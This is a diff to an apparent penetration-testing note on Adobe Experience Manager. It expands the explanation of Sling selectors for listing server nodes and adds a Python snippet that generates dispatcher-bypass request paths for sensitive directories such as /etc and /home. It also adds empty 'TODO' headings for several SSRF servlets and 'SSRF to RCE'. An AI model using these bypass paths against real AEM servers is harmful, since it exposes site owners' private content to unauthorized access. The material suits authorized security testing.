@@ -106,10 +106,10 @@ To _build_ such URLs you can use the following params:
  - **Selectors:**
     - `tidy`: _pretty-prints_ json
     - `infinity`
-    - `children`: _Huge profit!_
-    - `childrenlist`: _Huge profit!_
+    - `children`: Holds a list of every children node. You will list literally everything the server has (_Huge profit!_)
+    - `childrenlist`: Same behaviour as children(_Huge profit!_)
     - `ext`
-    - A numeric value: `-1`, `0`, `1...99999`
+    - A numeric value: `-1`, `0`, `1...99999`: The number would typically be the _depth_ of the results (-1 being infinite). A depth of 3 would traverse 3 nodes.
  - **Formats:**
     - `json`
     - `txt`
@@ -127,7 +127,7 @@ CACHE_BUSTER_LEN = 3
 JUICY_NODES = ['/', '/etc', '{{ extra-paths /bin }}', '/var', '/apps', '/home']
 JUICY_NODES = [p for pair in map(lambda x: (x, x.replace('/', '///')), JUICY_NODES) for p in pair]
 
-GETSERVLET = itertools.product(JUICY_NODES, ('', '.children'),('.json', '.1.json', '....4.2.1....json', '.json?{0}.css', '.json?{0}.ico', '.json?{0}.html','.json/{0}.css', '.json/{0}.html', '.json/{0}.png', '.json/{0}.ico','.json;%0a{0}.css', '.json;%0a{0}.png', '.json;%0a{0}.html', '.json;%0a{0}.ico'))
+GETSERVLET = itertools.product(JUICY_NODES, ('', '.children', '.childrenlist'),('.json', '.1.json', '....4.2.1....json', '.json?{0}.css', '.json?{0}.ico', '.json?{0}.html','.json/{0}.css', '.json/{0}.html', '.json/{0}.png', '.json/{0}.ico','.json;%0a{0}.css', '.json;%0a{0}.png', '.json;%0a{0}.html', '.json;%0a{0}.ico'))
 
 for path in ['{0}{1}{2}'.format(p1, p2, p3.format('{0}')) for p1, p2, p3 in GETSERVLET]:
     print(path.format(''.join(random.choice(string.ascii_letters) for _ in range(CACHE_BUSTER_LEN))))
@@ -143,6 +143,37 @@ It generally sits at `/bin/querybuilder.json`
 
 You can find more information on the following resources:
  - [Adobe - Query Builder API](https://experienceleague.adobe.com/docs/experience-manager-65/developing/platform/query-builder/querybuilder-api.html?lang=en)
+
+
+It is very useful. Allows you to search and even get node contents. Take 
+
+> TODO
+
+
+### ReportingServicesProxy SSRF
+
+> TODO
+
+
+### SalesforceSecretServlet SSRF
+
+> TODO
+
+
+### SiteCatalystServlet SSRF
+
+> TODO
+
+
+
+### AutoProvisioningServlet SSRF
+
+> TODO
+
+
+### SSRF to RCE
+
+> TODO
 
 
 
